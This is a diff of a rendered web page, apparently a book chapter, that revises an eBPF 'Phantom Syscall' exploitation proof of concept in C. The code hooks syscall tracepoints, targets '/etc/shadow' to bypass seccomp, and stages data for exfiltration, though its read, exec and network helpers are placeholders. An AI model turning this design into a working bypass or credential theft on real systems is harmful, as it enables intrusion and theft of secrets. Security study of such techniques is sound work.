@@ -53,6 +53,13 @@
                 
                     
                     
+                    <a href="/dBPF/chapter-0-field-manual-preface.html" >
+                        Chapter 0: Field Manual Preface
+                    </a>
+                    
+                
+                    
+                    
                     <a href="/dBPF/the-mirror-controls.html" >
                         The Mirror Controls
                     </a>
@@ -589,6 +596,12 @@ graph TD
 275
 276
 277
+278
+279
+280
+281
+282
+283
 </pre></td><td class="rouge-code"><pre><span class="c1">// @interactive: true</span>
 <span class="c1">// @copyable: true</span>
 <span class="c1">// Phantom Syscall - eBPF exploitation proof of concept</span>
@@ -663,18 +676,19 @@ graph TD
     <span class="k">return</span> <span class="p">(</span><span class="n">ts</span> <span class="o">&lt;&lt;</span> <span class="mi">32</span><span class="p">)</span> <span class="o">|</span> <span class="n">pid</span><span class="p">;</span>
 <span class="p">}</span>
 
-<span class="c1">// Check if this is our trigger file descriptor</span>
+<span class="c1">// FIXED: Check if this is our trigger file descriptor</span>
 <span class="k">static</span> <span class="n">__always_inline</span> <span class="n">bool</span> <span class="nf">is_trigger_fd</span><span class="p">(</span><span class="kt">int</span> <span class="n">fd</span><span class="p">)</span> <span class="p">{</span>
     <span class="n">u32</span> <span class="n">pid</span> <span class="o">=</span> <span class="n">bpf_get_current_pid_tgid</span><span class="p">()</span> <span class="o">&gt;&gt;</span> <span class="mi">32</span><span class="p">;</span>
     <span class="n">u32</span> <span class="o">*</span><span class="n">stored_fd</span> <span class="o">=</span> <span class="n">bpf_map_lookup_elem</span><span class="p">(</span><span class="o">&amp;</span><span class="n">fd_map</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">pid</span><span class="p">);</span>
     
     <span class="k">if</span> <span class="p">(</span><span class="n">stored_fd</span> <span class="o">&amp;&amp;</span> <span class="o">*</span><span class="n">stored_fd</span> <span class="o">==</span> <span class="n">fd</span><span class="p">)</span>
-<span class="c1">// Read a file using eBPF helpers (bypassing seccomp)</span>
-<span class="k">static</span> <span class="n">__always_inline</span> <span class="kt">int</span> <span class="n">read_file_ebpf</span><span class="p">(</span><span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="n">path</span><span class="p">,</span> <span class="kt">void</span> <span class="o">*</span><span class="n">buf</span><span class="p">,</span> <span class="kt">size_t</span> <span class="n">size</span><span class="p">)</span> <span class="p">{</span>
-    <span class="k">struct</span> <span class="n">bpf_object</span> <span class="o">*</span><span class="n">obj</span><span class="p">;</span>
-    <span class="kt">int</span> <span class="n">map_fd</span><span class="p">;</span>
-    <span class="kt">int</span> <span class="n">err</span><span class="p">;</span>
+        <span class="k">return</span> <span class="nb">true</span><span class="p">;</span>
     
+    <span class="k">return</span> <span class="p">(</span><span class="n">fd</span> <span class="o">==</span> <span class="n">TRIGGER_FD</span><span class="p">);</span>
+<span class="p">}</span>
+
+<span class="c1">// FIXED: Read a file using eBPF helpers (bypassing seccomp)</span>
+<span class="k">static</span> <span class="n">__always_inline</span> <span class="kt">int</span> <span class="nf">read_file_ebpf</span><span class="p">(</span><span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="n">path</span><span class="p">,</span> <span class="kt">void</span> <span class="o">*</span><span class="n">buf</span><span class="p">,</span> <span class="kt">size_t</span> <span class="n">size</span><span class="p">)</span> <span class="p">{</span>
     <span class="c1">// This is a simplified representation - actual implementation would be more complex</span>
     <span class="c1">// and would use available eBPF helpers to achieve the same effect</span>
     
@@ -686,13 +700,14 @@ graph TD
     
     <span class="c1">// For demonstration purposes, we'll use a placeholder</span>
     <span class="kt">char</span> <span class="n">data</span><span class="p">[</span><span class="n">MAX_DATA_SIZE</span><span class="p">]</span> <span class="o">=</span> <span class="s">"Sensitive data from restricted file</span><span class="se">\n</span><span class="s">"</span><span class="p">;</span>
-    <span class="n">__builtin_memcpy</span><span class="p">(</span><span class="n">buf</span><span class="p">,</span> <span class="n">data</span><span class="p">,</span> <span class="n">size</span> <span class="o">&lt;</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">data</span><span class="p">)</span> <span class="o">?</span> <span class="n">size</span> <span class="o">:</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">data</span><span class="p">));</span>
+    <span class="kt">size_t</span> <span class="n">copy_size</span> <span class="o">=</span> <span class="n">size</span> <span class="o">&lt;</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">data</span><span class="p">)</span> <span class="o">?</span> <span class="n">size</span> <span class="o">:</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">data</span><span class="p">);</span>
+    <span class="n">__builtin_memcpy</span><span class="p">(</span><span class="n">buf</span><span class="p">,</span> <span class="n">data</span><span class="p">,</span> <span class="n">copy_size</span><span class="p">);</span>
     
-    <span class="k">return</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">data</span><span class="p">);</span>
+    <span class="k">return</span> <span class="p">(</span><span class="kt">int</span><span class="p">)</span><span class="n">copy_size</span><span class="p">;</span>
 <span class="p">}</span>
 
 <span class="c1">// Execute a command using eBPF helpers (bypassing seccomp)</span>
-<span class="k">static</span> <span class="n">__always_inline</span> <span class="kt">int</span> <span class="n">exec_command_ebpf</span><span class="p">(</span><span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="n">cmd</span><span class="p">)</span> <span class="p">{</span>
+<span class="k">static</span> <span class="n">__always_inline</span> <span class="kt">int</span> <span class="nf">exec_command_ebpf</span><span class="p">(</span><span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="n">cmd</span><span class="p">)</span> <span class="p">{</span>
     <span class="c1">// This is a simplified representation - actual implementation would be more complex</span>
     <span class="c1">// In a real exploit, we would:</span>
     <span class="c1">// 1. Use bpf_get_current_task() to get the current task_struct</span>
@@ -711,7 +726,7 @@ graph TD
 <span class="p">}</span>
 
 <span class="c1">// Network operation using eBPF helpers (bypassing seccomp)</span>
-<span class="k">static</span> <span class="n">__always_inline</span> <span class="kt">int</span> <span class="n">network_operation_ebpf</span><span class="p">(</span><span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="n">host</span><span class="p">,</span> <span class="kt">int</span> <span class="n">port</span><span class="p">,</span> <span class="k">const</span> <span class="kt">void</span> <span class="o">*</span><span class="n">data</span><span class="p">,</span> <span class="kt">size_t</span> <span class="n">size</span><span class="p">)</span> <span class="p">{</span>
+<span class="k">static</span> <span class="n">__always_inline</span> <span class="kt">int</span> <span class="nf">network_operation_ebpf</span><span class="p">(</span><span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="n">host</span><span class="p">,</span> <span class="kt">int</span> <span class="n">port</span><span class="p">,</span> <span class="k">const</span> <span class="kt">void</span> <span class="o">*</span><span class="n">data</span><span class="p">,</span> <span class="kt">size_t</span> <span class="n">size</span><span class="p">)</span> <span class="p">{</span>
     <span class="c1">// This is a simplified representation - actual implementation would be more complex</span>
     <span class="c1">// In a real exploit, we would:</span>
     <span class="c1">// 1. Use socket-related eBPF helpers</span>
@@ -728,9 +743,9 @@ graph TD
     <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
 <span class="p">}</span>
 
-<span class="c1">// Hook the open syscall to identify interesting files</span>
-<span class="n">SEC</span><span class="p">(</span><span class="s">"tracepoint/syscalls/sys_enter_open"</span><span class="p">)</span>
-<span class="kt">int</span> <span class="n">trace_open_enter</span><span class="p">(</span><span class="k">struct</span> <span class="n">trace_event_raw_sys_enter</span> <span class="o">*</span><span class="n">ctx</span><span class="p">)</span> <span class="p">{</span>
+<span class="c1">// FIXED: Hook the openat syscall to identify interesting files (openat is more commonly used)</span>
+<span class="n">SEC</span><span class="p">(</span><span class="s">"tracepoint/syscalls/sys_enter_openat"</span><span class="p">)</span>
+<span class="kt">int</span> <span class="nf">trace_openat_enter</span><span class="p">(</span><span class="k">struct</span> <span class="n">trace_event_raw_sys_enter</span> <span class="o">*</span><span class="n">ctx</span><span class="p">)</span> <span class="p">{</span>
     <span class="c1">// Get process information</span>
     <span class="n">u32</span> <span class="n">pid</span> <span class="o">=</span> <span class="n">bpf_get_current_pid_tgid</span><span class="p">()</span> <span class="o">&gt;&gt;</span> <span class="mi">32</span><span class="p">;</span>
     
@@ -739,12 +754,13 @@ graph TD
     <span class="n">event</span><span class="p">.</span><span class="n">pid</span> <span class="o">=</span> <span class="n">pid</span><span class="p">;</span>
     <span class="n">bpf_get_current_comm</span><span class="p">(</span><span class="o">&amp;</span><span class="n">event</span><span class="p">.</span><span class="n">comm</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">event</span><span class="p">.</span><span class="n">comm</span><span class="p">));</span>
     <span class="n">event</span><span class="p">.</span><span class="n">timestamp</span> <span class="o">=</span> <span class="n">bpf_ktime_get_ns</span><span class="p">();</span>
-    <span class="n">event</span><span class="p">.</span><span class="n">syscall_nr</span> <span class="o">=</span> <span class="n">__NR_open</span><span class="p">;</span>
+    <span class="n">event</span><span class="p">.</span><span class="n">syscall_nr</span> <span class="o">=</span> <span class="n">__NR_openat</span><span class="p">;</span>
     
     <span class="c1">// Get syscall arguments</span>
-    <span class="n">event</span><span class="p">.</span><span class="n">args</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="n">ctx</span><span class="o">-&gt;</span><span class="n">args</span><span class="p">[</span><span class="mi">0</span><span class="p">];</span> <span class="c1">// pathname</span>
-    <span class="n">event</span><span class="p">.</span><span class="n">args</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">=</span> <span class="n">ctx</span><span class="o">-&gt;</span><span class="n">args</span><span class="p">[</span><span class="mi">1</span><span class="p">];</span> <span class="c1">// flags</span>
-    <span class="n">event</span><span class="p">.</span><span class="n">args</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span> <span class="o">=</span> <span class="n">ctx</span><span class="o">-&gt;</span><span class="n">args</span><span class="p">[</span><span class="mi">2</span><span class="p">];</span> <span class="c1">// mode</span>
+    <span class="n">event</span><span class="p">.</span><span class="n">args</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="n">ctx</span><span class="o">-&gt;</span><span class="n">args</span><span class="p">[</span><span class="mi">0</span><span class="p">];</span> <span class="c1">// dirfd</span>
+    <span class="n">event</span><span class="p">.</span><span class="n">args</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">=</span> <span class="n">ctx</span><span class="o">-&gt;</span><span class="n">args</span><span class="p">[</span><span class="mi">1</span><span class="p">];</span> <span class="c1">// pathname</span>
+    <span class="n">event</span><span class="p">.</span><span class="n">args</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span> <span class="o">=</span> <span class="n">ctx</span><span class="o">-&gt;</span><span class="n">args</span><span class="p">[</span><span class="mi">2</span><span class="p">];</span> <span class="c1">// flags</span>
+    <span class="n">event</span><span class="p">.</span><span class="n">args</span><span class="p">[</span><span class="mi">3</span><span class="p">]</span> <span class="o">=</span> <span class="n">ctx</span><span class="o">-&gt;</span><span class="n">args</span><span class="p">[</span><span class="mi">3</span><span class="p">];</span> <span class="c1">// mode</span>
     
     <span class="c1">// Get user/group ID</span>
     <span class="n">u64</span> <span class="n">uid_gid</span> <span class="o">=</span> <span class="n">bpf_get_current_uid_gid</span><span class="p">();</span>
@@ -752,7 +768,7 @@ graph TD
     <span class="n">event</span><span class="p">.</span><span class="n">gid</span> <span class="o">=</span> <span class="n">uid_gid</span> <span class="o">&gt;&gt;</span> <span class="mi">32</span><span class="p">;</span>
     
     <span class="c1">// Get the file path</span>
-    <span class="n">bpf_probe_read_user_str</span><span class="p">(</span><span class="n">event</span><span class="p">.</span><span class="n">path</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">event</span><span class="p">.</span><span class="n">path</span><span class="p">),</span> <span class="p">(</span><span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="n">ctx</span><span class="o">-&gt;</span><span class="n">args</span><span class="p">[</span><span class="mi">0</span><span class="p">]);</span>
+    <span class="n">bpf_probe_read_user_str</span><span class="p">(</span><span class="n">event</span><span class="p">.</span><span class="n">path</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">event</span><span class="p">.</span><span class="n">path</span><span class="p">),</span> <span class="p">(</span><span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="n">ctx</span><span class="o">-&gt;</span><span class="n">args</span><span class="p">[</span><span class="mi">1</span><span class="p">]);</span>
     
     <span class="c1">// Generate a unique ID for this event</span>
     <span class="n">u64</span> <span class="n">event_id</span> <span class="o">=</span> <span class="n">generate_event_id</span><span class="p">();</span>
@@ -763,18 +779,18 @@ graph TD
     <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
 <span class="p">}</span>
 
-<span class="c1">// Hook the read syscall to identify our trigger</span>
+<span class="c1">// FIXED: Hook the read syscall to identify our trigger</span>
 <span class="n">SEC</span><span class="p">(</span><span class="s">"tracepoint/syscalls/sys_enter_read"</span><span class="p">)</span>
-<span class="kt">int</span> <span class="n">trace_read_enter</span><span class="p">(</span><span class="k">struct</span> <span class="n">trace_event_raw_sys_enter</span> <span class="o">*</span><span class="n">ctx</span><span class="p">)</span> <span class="p">{</span>
+<span class="kt">int</span> <span class="nf">trace_read_enter</span><span class="p">(</span><span class="k">struct</span> <span class="n">trace_event_raw_sys_enter</span> <span class="o">*</span><span class="n">ctx</span><span class="p">)</span> <span class="p">{</span>
     <span class="c1">// Get the file descriptor</span>
-    <span class="kt">int</span> <span class="n">fd</span> <span class="o">=</span> <span class="n">ctx</span><span class="o">-&gt;</span><span class="n">args</span><span class="p">[</span><span class="mi">0</span><span class="p">];</span>
+    <span class="kt">int</span> <span class="n">fd</span> <span class="o">=</span> <span class="p">(</span><span class="kt">int</span><span class="p">)</span><span class="n">ctx</span><span class="o">-&gt;</span><span class="n">args</span><span class="p">[</span><span class="mi">0</span><span class="p">];</span>
     
     <span class="c1">// Check if this is our trigger file descriptor</span>
     <span class="k">if</span> <span class="p">(</span><span class="n">is_trigger_fd</span><span class="p">(</span><span class="n">fd</span><span class="p">))</span> <span class="p">{</span>
         <span class="c1">// This is our trigger - perform the phantom syscall operations</span>
         
         <span class="c1">// 1. Read a sensitive file that would be blocked by seccomp</span>
-        <span class="kt">char</span> <span class="n">data</span><span class="p">[</span><span class="n">MAX_DATA_SIZE</span><span class="p">];</span>
+        <span class="kt">char</span> <span class="n">data</span><span class="p">[</span><span class="n">MAX_DATA_SIZE</span><span class="p">]</span> <span class="o">=</span> <span class="p">{};</span>
         <span class="kt">int</span> <span class="n">bytes_read</span> <span class="o">=</span> <span class="n">read_file_ebpf</span><span class="p">(</span><span class="s">"/etc/shadow"</span><span class="p">,</span> <span class="n">data</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">data</span><span class="p">));</span>
         
         <span class="c1">// Store the data for exfiltration</span>
@@ -793,7 +809,10 @@ graph TD
         <span class="n">bpf_get_current_comm</span><span class="p">(</span><span class="o">&amp;</span><span class="n">event</span><span class="p">.</span><span class="n">comm</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">event</span><span class="p">.</span><span class="n">comm</span><span class="p">));</span>
         <span class="n">event</span><span class="p">.</span><span class="n">timestamp</span> <span class="o">=</span> <span class="n">bpf_ktime_get_ns</span><span class="p">();</span>
         <span class="n">event</span><span class="p">.</span><span class="n">syscall_nr</span> <span class="o">=</span> <span class="n">__NR_read</span><span class="p">;</span>
-        <span class="n">__builtin_memcpy</span><span class="p">(</span><span class="n">event</span><span class="p">.</span><span class="n">path</span><span class="p">,</span> <span class="s">"PHANTOM SYSCALL TRIGGERED"</span><span class="p">,</span> <span class="mi">25</span><span class="p">);</span>
+        <span class="n">event</span><span class="p">.</span><span class="n">args</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="n">ctx</span><span class="o">-&gt;</span><span class="n">args</span><span class="p">[</span><span class="mi">0</span><span class="p">];</span> <span class="c1">// fd</span>
+        <span class="n">event</span><span class="p">.</span><span class="n">args</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">=</span> <span class="n">ctx</span><span class="o">-&gt;</span><span class="n">args</span><span class="p">[</span><span class="mi">1</span><span class="p">];</span> <span class="c1">// buf</span>
+        <span class="n">event</span><span class="p">.</span><span class="n">args</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span> <span class="o">=</span> <span class="n">ctx</span><span class="o">-&gt;</span><span class="n">args</span><span class="p">[</span><span class="mi">2</span><span class="p">];</span> <span class="c1">// count</span>
+        <span class="n">__builtin_memcpy</span><span class="p">(</span><span class="n">event</span><span class="p">.</span><span class="n">path</span><span class="p">,</span> <span class="s">"PHANTOM SYSCALL TRIGGERED"</span><span class="p">,</span> <span class="mi">26</span><span class="p">);</span>
         
         <span class="c1">// Log the event for our analysis</span>
         <span class="n">bpf_perf_event_output</span><span class="p">(</span><span class="n">ctx</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">events</span><span class="p">,</span> <span class="n">BPF_F_CURRENT_CPU</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">event</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">event</span><span class="p">));</span>
@@ -804,7 +823,7 @@ graph TD
 
 <span class="c1">// Hook the read syscall return to exfiltrate data</span>
 <span class="n">SEC</span><span class="p">(</span><span class="s">"tracepoint/syscalls/sys_exit_read"</span><span class="p">)</span>
-<span class="kt">int</span> <span class="n">trace_read_exit</span><span class="p">(</span><span class="k">struct</span> <span class="n">trace_event_raw_sys_exit</span> <span class="o">*</span><span class="n">ctx</span><span class="p">)</span> <span class="p">{</span>
+<span class="kt">int</span> <span class="nf">trace_read_exit</span><span class="p">(</span><span class="k">struct</span> <span class="n">trace_event_raw_sys_exit</span> <span class="o">*</span><span class="n">ctx</span><span class="p">)</span> <span class="p">{</span>
     <span class="c1">// Get the file descriptor from our stored event</span>
     <span class="n">u32</span> <span class="n">pid</span> <span class="o">=</span> <span class="n">bpf_get_current_pid_tgid</span><span class="p">()</span> <span class="o">&gt;&gt;</span> <span class="mi">32</span><span class="p">;</span>
     <span class="n">u32</span> <span class="o">*</span><span class="n">fd</span> <span class="o">=</span> <span class="n">bpf_map_lookup_elem</span><span class="p">(</span><span class="o">&amp;</span><span class="n">fd_map</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">pid</span><span class="p">);</span>
@@ -840,7 +859,7 @@ graph TD
 
 <span class="c1">// Hook the seccomp syscall to detect when seccomp is being set up</span>
 <span class="n">SEC</span><span class="p">(</span><span class="s">"tracepoint/syscalls/sys_enter_seccomp"</span><span class="p">)</span>
-<span class="kt">int</span> <span class="n">trace_seccomp_enter</span><span class="p">(</span><span class="k">struct</span> <span class="n">trace_event_raw_sys_enter</span> <span class="o">*</span><span class="n">ctx</span><span class="p">)</span> <span class="p">{</span>
+<span class="kt">int</span> <span class="nf">trace_seccomp_enter</span><span class="p">(</span><span class="k">struct</span> <span class="n">trace_event_raw_sys_enter</span> <span class="o">*</span><span class="n">ctx</span><span class="p">)</span> <span class="p">{</span>
     <span class="c1">// Get process information</span>
     <span class="n">u32</span> <span class="n">pid</span> <span class="o">=</span> <span class="n">bpf_get_current_pid_tgid</span><span class="p">()</span> <span class="o">&gt;&gt;</span> <span class="mi">32</span><span class="p">;</span>
     
@@ -866,9 +885,6 @@ graph TD
     
     <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
 <span class="p">}</span>
-</pre></td></tr></tbody></table></code></pre></div></div>
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
-</pre></td><td class="rouge-code"><pre>    return true;
 </pre></td></tr></tbody></table></code></pre></div></div>
 
 <h3 id="user-space-control-program">User-Space Control Program</h3>
